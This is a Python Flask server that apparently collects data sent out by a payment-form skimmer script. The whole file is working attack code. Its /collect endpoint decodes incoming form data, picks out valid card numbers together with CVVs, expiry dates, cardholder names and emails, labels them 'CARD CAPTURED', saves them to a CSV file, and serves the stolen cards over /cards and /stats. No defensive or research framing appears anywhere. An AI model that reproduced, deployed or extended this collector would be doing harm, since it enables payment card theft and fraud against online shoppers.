from flask import Flask, request, jsonify
import base64, json, re, csv, os, time, threading
from datetime import datetime
import requests as req

app = Flask(__name__)
CARDS_FILE = "live_cards.csv"
LOG_FILE = "captures.log"
all_cards = []

def luhn_check(n):
    n = re.sub(r'[^\d]', '', str(n))
    if len(n) < 13 or len(n) > 19: return False
    t = 0
    for i, d in enumerate(reversed(n)):
        d = int(d)
        if i % 2 == 1:
            d *= 2
            if d > 9: d -= 9
        t += d
    return t % 10 == 0

def card_type(n):
    n = str(n)
    if n.startswith('4'): return 'VISA'
    if n[:2] in ['51','52','53','54','55']: return 'MASTERCARD'
    if n[:2] in ['34','37']: return 'AMEX'
    if n[:4] == '6011' or n[:2] == '65': return 'DISCOVER'
    return 'UNKNOWN'

def extract_cards(s):
    cards = []
    pats = [re.compile(r'\b4\d{3}[\s\-]?\d{4}[\s\-]?\d{4}[\s\-]?\d{3,4}\b'),
            re.compile(r'\b5[1-5]\d{2}[\s\-]?\d{4}[\s\-]?\d{4}[\s\-]?\d{4}\b'),
            re.compile(r'\b3[47]\d{2}[\s\-]?\d{6}[\s\-]?\d{5}\b'),
            re.compile(r'\b(?:\d[ -]*?){13,19}\b')]
    cvv_p = re.compile(r'(?:cvv|cvc|security)\s*["\']?\s*[:\-=]?\s*["\']?\s*(\d{3,4})', re.I)
    exp_p = re.compile(r'(\d{1,2}[/\-]\d{2,4})')
    name_p = re.compile(r'(?:name|holder)\s*["\']?\s*[:\-=]?\s*["\']?([A-Za-z ]{3,50})', re.I)
    email_p = re.compile(r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b')
    found = set()
    for p in pats:
        for m in p.findall(s):
            c = re.sub(r'[^\d]', '', m)
            if len(c) < 13 or len(c) > 19 or c in found: continue
            if not luhn_check(c): continue
            found.add(c)
            ctx = s[max(0,s.find(m)-500):s.find(m)+500]
            cards.append({
                'card_number': c,
                'card_type': card_type(c),
                'cvv': (cvv_p.search(ctx) or [None,''])[1] if cvv_p.search(ctx) else '',
                'expiry': (exp_p.search(ctx) or [None,''])[1] if exp_p.search(ctx) else '',
                'name': (name_p.search(ctx) or [None,''])[1].strip() if name_p.search(ctx) else '',
                'email': (email_p.search(ctx) or [None,''])[0] if email_p.search(ctx) else '',
                'captured_at': datetime.now().isoformat()
            })
    return cards

@app.route('/')
def home():
    return "Server running. /collect for data. /cards to view. /stats for stats."

@app.route('/collect', methods=['GET','POST'])
def collect():
    payload = None
    if request.method == 'GET':
        enc = request.args.get('d','')
        if enc:
            try: payload = json.loads(base64.b64decode(enc).decode('utf-8',errors='ignore'))
            except: pass
    else:
        try: payload = request.get_json(force=True)
        except:
            try: payload = json.loads(request.get_data(as_text=True))
            except: payload = {'raw': request.get_data(as_text=True)}
    if not payload: return '', 204
    ts = datetime.now().strftime('%H:%M:%S')
    ps = json.dumps(payload)
    cards = extract_cards(ps)
    if cards:
        for card in cards:
            card['source_url'] = payload.get('_meta',{}).get('page','') if isinstance(payload,dict) else ''
            card['user_agent'] = payload.get('_meta',{}).get('user_agent','') if isinstance(payload,dict) else ''
            all_cards.append(card)
            print(f"\n[{ts}] *** CARD CAPTURED ***")
            print(f"  Type:   {card['card_type']}")
            print(f"  Number: {card['card_number']}")
            print(f"  CVV:    {card['cvv'] or 'N/A'}")
            print(f"  Expiry: {card['expiry'] or 'N/A'}")
            print(f"  Name:   {card['name'] or 'N/A'}")
            print(f"  Email:  {card['email'] or 'N/A'}")
            print(f"  Source: {card['source_url']}")
            fe = os.path.exists(CARDS_FILE)
            with open(CARDS_FILE,'a',newline='') as f:
                w = csv.DictWriter(f, fieldnames=['card_type','card_number','cvv','expiry','name','email','source_url','user_agent','captured_at'])
                if not fe: w.writeheader()
                w.writerow(card)
    else:
        print(f"[{ts}] Data (no card): {ps[:200]}")
        with open(LOG_FILE,'a') as f: f.write(f"[{ts}] {ps}\n")
    return '', 204

@app.route('/cards')
def view_cards(): return jsonify(all_cards)

@app.route('/stats')
def stats():
    return jsonify({
        'total_cards': len(all_cards),
        'cards_with_cvv': sum(1 for c in all_cards if c.get('cvv')),
        'cards_with_name': sum(1 for c in all_cards if c.get('name')),
        'cards_with_email': sum(1 for c in all_cards if c.get('email'))
    })

def keep_alive():
    while True:
        try: req.get('http://localhost:8080/')
        except: pass
        time.sleep(300)

threading.Thread(target=keep_alive, daemon=True).start()
app.run(host='0.0.0.0', port=8080)
